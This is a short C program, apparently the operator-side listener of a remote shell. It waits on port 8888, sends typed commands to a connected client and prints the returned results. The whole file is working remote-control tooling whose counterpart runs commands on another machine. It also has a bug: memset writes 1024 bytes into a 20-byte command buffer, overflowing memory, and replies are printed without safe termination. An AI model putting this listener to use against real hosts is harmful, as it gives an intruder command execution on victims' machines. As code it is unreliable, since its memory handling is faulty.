

#include <stdio.h> 
#include <netdb.h> 
#include <netinet/in.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <unistd.h> 
#define MAX 1024 
#define PORT 8888
#define SA struct sockaddr 
   

void dollar_sign(int connfd) 
{ 
    char buff[MAX]; 
    int n; 
    int valread;
    char cmd_input[20] = "";
    int COMMAND_LIMIT = 20;
    for (;;){

        printf("$ ");

        fgets(cmd_input, COMMAND_LIMIT, stdin);

        if (strncmp("term", cmd_input, 4) == 0) { 
            break; 
        } 

        send(connfd, cmd_input, strlen(cmd_input), 0);
        printf("cmd sent:\n");
        printf("-----BEGIN RESULT-----\n");
        valread = read(connfd, buff, sizeof(buff));
        printf("%s", buff);
        memset(buff, 0, sizeof(buff));
        printf("-----END RESULT-----\n");

        memset(cmd_input, 0, sizeof(buff));

    } 
} 
   
int main() 
{ 
    int sockfd, connfd, len; 
    struct sockaddr_in servaddr, cli; 
   
    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    if (sockfd == -1) { 
        printf("socket creation failed\n"); 
        exit(0); 
    } 

    bzero(&servaddr, sizeof(servaddr)); 
   
    servaddr.sin_family = AF_INET; 
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY); 
    servaddr.sin_port = htons(PORT); 
   

    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) { 
        printf("socket bind failed\n"); 
        exit(0); 
    } 
   
    if ((listen(sockfd, 5)) != 0) { 
        printf("listen failed\n"); 
        exit(0); 
    } 
    else
        printf("dollar sign is ready\n"); 
    len = sizeof(cli); 
   
    connfd = accept(sockfd, (SA*)&cli, &len); 
    if (connfd < 0) { 
        printf("accept failed\n"); 
        exit(0); 
    } 
    
    dollar_sign(connfd); 
   
    close(sockfd); 
    printf("connection terminated\n");
}